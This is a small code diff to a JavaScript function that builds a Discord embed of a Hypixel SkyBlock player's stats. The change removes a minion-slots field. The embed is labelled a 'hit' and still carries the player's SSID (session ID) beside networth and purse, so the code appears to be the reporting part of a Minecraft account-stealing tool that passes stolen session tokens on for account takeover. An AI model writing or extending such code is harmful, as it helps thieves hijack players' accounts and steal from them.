@@ -79,7 +79,6 @@ const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
   const uNetworth = Math.floor(firstProfileData.data.networth.unsoulboundNetworth).toLocaleString('en-US', { style: 'decimal' });
   const avgSkillLvl = Math.floor(firstProfileData.data.average_level);
   const SBLevel = Math.floor(firstProfileData.data.skyblock_level.level);
-  const minionSlots = Math.floor(firstProfileData.data.minion_slots.currentSlots);
   const purse = Math.floor(firstProfileData.data.purse).toLocaleString('en-US', { style: 'decimal' });
 
   const embed = new EmbedBuilder()
@@ -93,7 +92,6 @@ const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
       { name: 'Unsoulbound', value: '```' + uNetworth + '```' },
       { name: 'Average Skill Lvl', value: '```' + avgSkillLvl + '```' },
       { name: 'SB Level', value: '```' + SBLevel + '```' },
-      { name: 'Minion Slots', value: '```' + minionSlots + '```' },
       { name: 'Purse', value: '```' + purse + '```' },
       { name: 'SSID', value: SSIDCode }
     )
